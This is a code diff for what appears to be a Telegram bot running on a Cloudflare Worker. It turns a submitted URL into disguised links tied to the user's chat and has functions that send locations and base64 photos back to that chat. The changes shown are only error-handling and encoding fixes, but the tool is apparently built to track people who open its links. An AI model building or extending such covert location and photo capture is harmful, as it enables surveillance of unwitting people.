@@ -53,7 +53,7 @@ const webviewTemplate = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta 
  */
 function decodeBase64(str) {
   try {
-    return atob(str);
+    return decodeURIComponent(escape(atob(str)));
   } catch (e) {
     console.error("Base64 decoding failed:", e);
     return null;
@@ -106,12 +106,11 @@ async function sendTelegramMessage(env, chatId, text, options = {}) {
     const result = await response.json();
     if (!result.ok) {
       console.error('Telegram API error:', result.description);
-      throw new Error(`Telegram API error: ${result.description}`);
     }
     return result;
   } catch (error) {
     console.error('Error sending Telegram message:', error);
-    throw error;
+    return { ok: false, error: error.message };
   }
 }
 
@@ -135,7 +134,7 @@ async function sendTelegramLocation(env, chatId, lat, lon) {
     return result;
   } catch (error) {
     console.error("Error sending location:", error);
-    throw error;
+    return { ok: false, error: error.message };
   }
 }
 
@@ -173,12 +172,11 @@ async function sendTelegramPhoto(env, chatId, rawBase64Img, caption = "") {
     const result = await response.json();
     if (!result.ok) {
       console.error('Telegram sendPhoto API error:', result.description);
-      throw new Error(`Telegram sendPhoto API error: ${result.description}`);
     }
     return result;
   } catch (error) {
     console.error('Error sending Telegram photo:', error);
-    throw error;
+    return { ok: false, error: error.message };
   }
 }
 
@@ -209,9 +207,9 @@ async function checkWebhookStatus(env) {
   }
 }
 
-async function setupWebhook(env) {
+async function setupWebhook(env, request) {
   const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
-  const HOST_URL = env.HOST_URL || "https://your-worker-domain.workers.dev";
+  const HOST_URL = env.HOST_URL || `${new URL(request.url).protocol}//${new URL(request.url).host}`;
   try {
     const webhookUrl = `${HOST_URL}/webhook`;
     const response = await fetch(`${TELEGRAM_API}/setWebhook`, {
@@ -231,8 +229,8 @@ async function setupWebhook(env) {
 /**
  * Bot functionality
  */
-async function createLink(env, chatId, url) {
-  const HOST_URL = env.HOST_URL || "https://your-worker-domain.workers.dev";
+async function createLink(env, chatId, url, request) {
+  const HOST_URL = env.HOST_URL || `${new URL(request.url).protocol}//${new URL(request.url).host}`;
   try {
     // Basic URL validation
     if (!url.match(/^https?:\/\/.+/i)) {
@@ -241,17 +239,8 @@ async function createLink(env, chatId, url) {
       return;
     }
     
-    // Check for encoded characters
-    const hasEncodedChars = [...url].some(char => char.charCodeAt(0) > 127);
-    
-    if (hasEncodedChars) {
-      await sendTelegramMessage(env, chatId, `⚠️ URL contains special characters that may cause issues.`);
-      await createNew(env, chatId);
-      return;
-    }
-    
     const uid = chatId.toString(36);
-    const encodedUrl = btoa(url);
+    const encodedUrl = btoa(unescape(encodeURIComponent(url)));
     
     const cUrl = `${HOST_URL}/c/${uid}/${encodedUrl}`;
     const wUrl = `${HOST_URL}/w/${uid}/${encodedUrl}`;
@@ -285,7 +274,7 @@ async function createNew(env, chatId) {
  * Main request handler
  */
 async function handleRequest(request, env) {
-  const HOST_URL = env.HOST_URL || "https://your-worker-domain.workers.dev";
+  const HOST_URL = env.HOST_URL || `${new URL(request.url).protocol}//${new URL(request.url).host}`;
   const TELEGRAM_API = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN"}`;
   // Handle preflight requests
   if (request.method === "OPTIONS") {
@@ -305,7 +294,7 @@ async function handleRequest(request, env) {
         const webhookInfo = await checkWebhookStatus(env);
         
         // Set up webhook
-        const setupResult = await setupWebhook(env);
+        const setupResult = await setupWebhook(env, request);
         
         // Check if the request wants JSON or HTML
         const acceptHeader = request.headers.get("accept") || "";
@@ -373,7 +362,7 @@ async function handleRequest(request, env) {
             }
           } else if (update.message.reply_to_message && update.message.reply_to_message.text === '🌐 Enter Your URL') {
             // Handle URL submission
-            await createLink(env, chatId, text);
+            await createLink(env, chatId, text, request);
           } else {
             // Handle regular messages
             await sendTelegramMessage(env, chatId, "📝 You said: " + text + "\n\nUse /help to see available commands.");
